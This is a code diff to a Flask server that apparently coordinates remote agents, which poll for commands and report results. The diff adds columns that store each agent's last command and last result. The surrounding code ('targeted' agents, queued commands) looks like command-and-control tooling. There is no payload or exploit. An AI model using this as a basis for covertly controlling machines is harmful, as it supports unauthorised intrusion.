@@ -35,6 +35,8 @@ class Agent(db.Model):
     status = db.Column(db.String(20), default='active')
     targeted = db.Column(db.Boolean,default=False)
     last_seen = db.Column(db.DateTime, default=datetime.now(tz=timezone.utc))
+    last_command = db.Column(db.String(5000), nullable=True,default="NULL")
+    last_result = db.Column(db.String(10000), nullable=True,default="NULL")
 
 class Task(db.Model):
     id = db.Column(db.Integer, primary_key=True)
@@ -128,6 +130,8 @@ def submit_results():
         task.returncode = data['returncode']
         if task.result != "NULL":
             task.result = result
+        agent = Agent.query.filter_by(agent_id=agent_id).first()
+        agent.last_result = result
         db.session.commit()
         update_timestamp(agent_id)
         return jsonify({'status': 'success'})
@@ -152,6 +156,7 @@ def get_task():
     ip = request.json.get('agent_id')
     #agent_id = request.args.get('agent_id')
     if ip:
+        agent = Agent.query.filter_by(agent_id=ip).first()
         task = Task.query.filter_by(agent_id=ip, completed=False).first()
         if task:
             task_data = {
@@ -160,6 +165,8 @@ def get_task():
                 'filename': task.filename,
                 'task_id': task.id
             }
+            agent.last_command = task.command
+            db.session.commit()
             return jsonify(task_data),200
         return jsonify({"status": "No tasks"}), 204
     return jsonify({"status": "Must re-register"}), 418
